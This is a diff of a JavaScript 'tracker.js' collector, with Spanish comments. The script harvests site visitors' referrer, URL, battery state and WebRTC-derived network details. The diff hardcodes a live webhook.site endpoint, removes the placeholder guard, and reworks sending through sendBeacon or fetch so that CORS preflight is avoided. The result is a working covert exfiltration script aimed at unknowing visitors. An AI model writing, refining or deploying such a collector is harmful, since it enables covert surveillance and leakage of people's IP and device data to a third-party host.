@@ -1,19 +1,10 @@
 // language: JavaScript, file: tracker.js
-// *Recolector — manda todo a Webhook.site*
+// *Recolector v2 — sin preflight CORS*
 
 (function () {
   'use strict';
 
-  // ═══════════════════════════════════════════════════════
-  // PEGÁ ACÁ TU URL DE WEBHOOK.SITE
-  // Ejemplo: "https://webhook.site/abc-123-def-456"
-  // ═══════════════════════════════════════════════════════
   var WEBHOOK_URL = "https://webhook.site/b5442b12-8160-44e8-a32d-f8e1cb26d2e4";
-
-  if (WEBHOOK_URL.indexOf("PEGA_AQUI") === 0) {
-    console.warn("[tracker] WEBHOOK_URL no configurada. Editá tracker.js.");
-    return;
-  }
 
   var data = {};
 
@@ -161,7 +152,7 @@
   data.referer = document.referrer || null;
   data.url = window.location.href;
 
-  // ─── Batería (async) ───
+  // ─── Batería ───
   data.battery = null;
   function tryBattery(cb) {
     if (!navigator.getBattery) { cb(); return; }
@@ -194,28 +185,40 @@
     } catch (e) { cb(); }
   }
 
-// ─── Envío ───
-function send() {
-  data.time_on_page = (Date.now() - data.timestamp) / 1000;
-  var payload = JSON.stringify(data);
-  try {
+  // ═══════════════════════════════════════════════════════
+  // ENVÍO — SIN PREFLIGHT CORS
+  // ═══════════════════════════════════════════════════════
+  function send() {
+    data.time_on_page = (Date.now() - data.timestamp) / 1000;
+    var payload = JSON.stringify(data);
+
+    // Opción 1: sendBeacon con text/plain → sin preflight
     if (navigator.sendBeacon) {
-      // text/plain evita preflight CORS
-      var blob = new Blob([payload], { type: "text/plain;charset=UTF-8" });
-      navigator.sendBeacon(WEBHOOK_URL, blob);
-    } else {
-      // fetch sin headers custom, sin no-cors
+      try {
+        var blob = new Blob([payload], { type: "text/plain;charset=UTF-8" });
+        navigator.sendBeacon(WEBHOOK_URL, blob);
+        console.log("[tracker] enviado via sendBeacon");
+        return;
+      } catch (e) {
+        console.warn("[tracker] sendBeacon falló, usando fetch", e);
+      }
+    }
+
+    // Opción 2: fetch sin headers custom → sin preflight
+    try {
       fetch(WEBHOOK_URL, {
         method: "POST",
         body: payload
-      }).catch(function () {});
+      }).then(function () {
+        console.log("[tracker] enviado via fetch");
+      }).catch(function (e) {
+        console.warn("[tracker] fetch falló", e);
+      });
+    } catch (e) {
+      console.warn("[tracker] error total", e);
     }
-  } catch (e) {
-    console.warn("[tracker] error al enviar", e);
   }
-}
 
-  // ─── Flujo: batería → webrtc → enviar ───
   tryBattery(function () {
     tryWebRTC(function () {
       send();
